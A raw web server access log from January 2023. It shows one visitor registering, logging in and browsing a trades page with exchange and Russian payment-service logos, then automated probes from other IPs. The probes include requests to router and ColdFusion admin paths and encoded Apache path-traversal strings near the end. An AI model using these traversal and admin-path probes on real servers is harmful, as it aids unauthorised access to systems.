45.14.71.23 - - [21/Jan/2023:18:43:42 +0000] "GET /static/js/vendors/swiper/swiper-bundle.min.js HTTP/1.1" 200 39377 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:43 +0000] "GET /static/images/img/logos/Huobi-logo.png HTTP/1.1" 200 9429 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:43 +0000] "GET /static/images/img/logos/bybit-logo.png HTTP/1.1" 200 10216 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:43 +0000] "GET /static/images/img/logos/okx-logo.png HTTP/1.1" 200 6773 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:43 +0000] "GET /static/images/img/logos/Bitzlato-logo.png HTTP/1.1" 200 12973 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:40 +0000] "GET /static/js/vendors/fontawesome/all.min.js HTTP/1.1" 200 314216 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:43 +0000] "GET /trades HTTP/1.1" 302 736 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:43 +0000] "GET /static/images/img/logos/Kucoin-logo.png HTTP/1.1" 200 11518 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:44 +0000] "GET /singin?next=%2Ftrades HTTP/1.1" 200 2898 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:45 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/singin?next=%2Ftrades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:45 +0000] "GET /static/js/vendors/fontawesome/all.min.js HTTP/1.1" 200 633208 "http://23.111.202.27/singin?next=%2Ftrades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:50 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "http://23.111.202.27/singin?next=%2Ftrades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:53 +0000] "GET / HTTP/1.1" 200 3038 "http://23.111.202.27/singin?next=%2Ftrades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:54 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:54 +0000] "GET /assets/img/hero/hero-bg.png HTTP/1.1" 404 419 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:58 +0000] "GET /singup HTTP/1.1" 200 2789 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:43:59 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/singup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:44:21 +0000] "POST /singup HTTP/1.1" 500 452 "http://23.111.202.27/singup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:45:13 +0000] "-" 408 0 "-" "-"
45.14.71.23 - - [21/Jan/2023:18:45:13 +0000] "-" 408 0 "-" "-"
45.14.71.23 - - [21/Jan/2023:18:46:14 +0000] "GET /singin HTTP/1.1" 200 2731 "http://23.111.202.27/singup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:15 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:23 +0000] "POST /singin HTTP/1.1" 302 695 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:24 +0000] "GET /profile HTTP/1.1" 200 2953 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:27 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/profile" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:31 +0000] "GET /userava HTTP/1.1" 200 19296 "http://23.111.202.27/profile" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:34 +0000] "GET /trades HTTP/1.1" 200 5846 "http://23.111.202.27/profile" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:35 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:35 +0000] "GET /static/css/example-styles.css HTTP/1.1" 200 1083 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:35 +0000] "GET /static/css/util.css HTTP/1.1" 200 12495 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:36 +0000] "GET /static/css/table.css HTTP/1.1" 200 1525 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:36 +0000] "GET /static/js/src/jquery-2.2.4.min.js HTTP/1.1" 200 30175 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:37 +0000] "GET /static/js/src/jquery.multi-select.js HTTP/1.1" 200 3629 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /static/images/small%20logo/okx-small-logo.png HTTP/1.1" 200 6058 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /static/images/small%20logo/sberbank-small-logo.png HTTP/1.1" 200 2257 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /static/images/small%20logo/binance-small-logo.png HTTP/1.1" 200 8345 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /static/images/small%20logo/qiwi-small-logo.png HTTP/1.1" 200 7118 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /static/images/small%20logo/tinkoff-small-logo.png HTTP/1.1" 200 20503 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /static/images/small%20logo/kucoin-small-logo.png HTTP/1.1" 200 7968 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /None HTTP/1.1" 404 418 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:39 +0000] "GET /static/images/small%20logo/garantex-small-logo.png HTTP/1.1" 200 11601 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:39 +0000] "GET /static/images/small%20logo/sbp-small-logo.png HTTP/1.1" 200 7657 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:39 +0000] "GET /static/images/small%20logo/yoomoney-small-logo.png HTTP/1.1" 200 9560 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:38 +0000] "GET /trades HTTP/1.1" 200 5812 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:39 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 491 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:40 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:40 +0000] "GET /None HTTP/1.1" 404 418 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:40 +0000] "GET /static/images/small%20logo/sbp-small-logo.png HTTP/1.1" 206 334 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:40 +0000] "GET /static/images/small%20logo/yoomoney-small-logo.png HTTP/1.1" 206 335 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:40 +0000] "GET /static/images/small%20logo/garantex-small-logo.png HTTP/1.1" 206 337 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:41 +0000] "GET /static/images/small%20logo/sbp-small-logo.png HTTP/1.1" 206 2897 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:41 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 492 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:41 +0000] "GET /static/images/small%20logo/yoomoney-small-logo.png HTTP/1.1" 206 2965 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:46:41 +0000] "GET /static/images/small%20logo/garantex-small-logo.png HTTP/1.1" 206 1076 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:18:47:32 +0000] "-" 408 0 "-" "-"
193.35.18.189 - - [21/Jan/2023:18:53:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://23.111.202.27:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
74.84.150.150 - - [21/Jan/2023:18:57:32 +0000] "GET /robots.txt HTTP/1.1" 404 382 "-" "test"
68.69.184.202 - - [21/Jan/2023:18:57:33 +0000] "GET / HTTP/1.1" 200 2995 "-" "test"
45.14.71.23 - - [21/Jan/2023:19:01:34 +0000] "GET /trades HTTP/1.1" 200 5403 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:01:36 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:01:36 +0000] "GET /None HTTP/1.1" 404 418 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:01:36 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 491 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:01:46 +0000] "GET /trades HTTP/1.1" 200 5403 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:01:47 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:01:47 +0000] "GET /None HTTP/1.1" 404 418 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:01:48 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 491 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:02:03 +0000] "POST /trades HTTP/1.1" 200 5517 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:02:04 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:02:05 +0000] "GET /None HTTP/1.1" 404 418 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:02:05 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 491 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:02:56 +0000] "-" 408 0 "-" "-"
45.14.71.23 - - [21/Jan/2023:19:05:18 +0000] "GET / HTTP/1.1" 200 3077 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:18 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:18 +0000] "GET /assets/img/hero/hero-bg.png HTTP/1.1" 404 419 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:24 +0000] "GET /logout HTTP/1.1" 302 634 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:25 +0000] "GET /singin HTTP/1.1" 200 2873 "http://23.111.202.27/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:25 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:28 +0000] "GET /singup HTTP/1.1" 200 2789 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:29 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/singup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:05:53 +0000] "POST /singup HTTP/1.1" 500 452 "http://23.111.202.27/singup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:13 +0000] "POST /singup HTTP/1.1" 302 671 "http://23.111.202.27/singup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:15 +0000] "GET /singin HTTP/1.1" 200 2871 "http://23.111.202.27/singup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:15 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:28 +0000] "POST /singin HTTP/1.1" 302 695 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:28 +0000] "GET /profile HTTP/1.1" 200 2950 "http://23.111.202.27/singin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:30 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/profile" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:33 +0000] "GET /userava HTTP/1.1" 200 19296 "http://23.111.202.27/profile" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:35 +0000] "GET /trades HTTP/1.1" 200 5442 "http://23.111.202.27/profile" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:36 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:36 +0000] "GET /None HTTP/1.1" 404 418 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:37 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 491 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:42 +0000] "GET /trades HTTP/1.1" 200 5403 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:44 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:44 +0000] "GET /None HTTP/1.1" 404 419 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:06:45 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 491 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:07:17 +0000] "GET /trades HTTP/1.1" 200 5444 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:07:18 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 492 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:07:19 +0000] "GET /None HTTP/1.1" 404 418 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:07:19 +0000] "GET /static/fonts/OpenSans/OpenSans-Regular.ttf HTTP/1.1" 404 491 "http://23.111.202.27/static/css/table.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:07:41 +0000] "GET /index.html HTTP/1.1" 200 3073 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:07:42 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 491 "http://23.111.202.27/index.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
45.14.71.23 - - [21/Jan/2023:19:07:42 +0000] "GET /assets/img/hero/hero-bg.png HTTP/1.1" 404 419 "http://23.111.202.27/index.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
40.77.167.46 - - [21/Jan/2023:19:14:31 +0000] "GET / HTTP/1.1" 200 3032 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
179.43.177.242 - - [21/Jan/2023:19:37:42 +0000] "GET / HTTP/1.1" 200 9345 "-" "Hello World"
185.163.126.103 - - [21/Jan/2023:19:52:23 +0000] "GET /CFIDE/administrator/ HTTP/1.1" 404 419 "-" "-"
162.221.192.26 - - [21/Jan/2023:20:01:40 +0000] "GET / HTTP/1.1" 200 2976 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.221.192.26 - - [21/Jan/2023:20:01:40 +0000] "HEAD /icons/sphere1.png HTTP/1.1" 200 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.221.192.26 - - [21/Jan/2023:20:01:41 +0000] "HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.221.192.26 - - [21/Jan/2023:20:01:41 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.221.192.26 - - [21/Jan/2023:20:01:41 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
